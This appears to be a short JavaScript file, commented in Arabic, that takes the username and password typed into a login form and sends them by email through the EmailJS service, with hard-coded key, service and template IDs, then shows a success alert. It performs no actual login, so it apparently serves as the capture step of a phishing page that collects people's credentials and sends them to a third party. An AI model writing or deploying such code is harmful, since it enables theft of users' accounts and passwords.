// تهيئة EmailJS
emailjs.init("1xqwBMfecM1SSulsh");

// عندما يتم إرسال النموذج
document.getElementById('login-form').onsubmit = function(event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // إنشاء الرسالة
    const message = {
        username: username,
        password: password
    };

    // إرسال البيانات عبر EmailJS
    emailjs.send("service_ir3vg5y", "template_jw2qkzr", message)
        .then(function(response) {
            alert("تم إرسال البيانات بنجاح!");
        }, function(error) {
            alert("فشل في إرسال البيانات. حاول مرة أخرى.");
            console.error(error);
        });
};
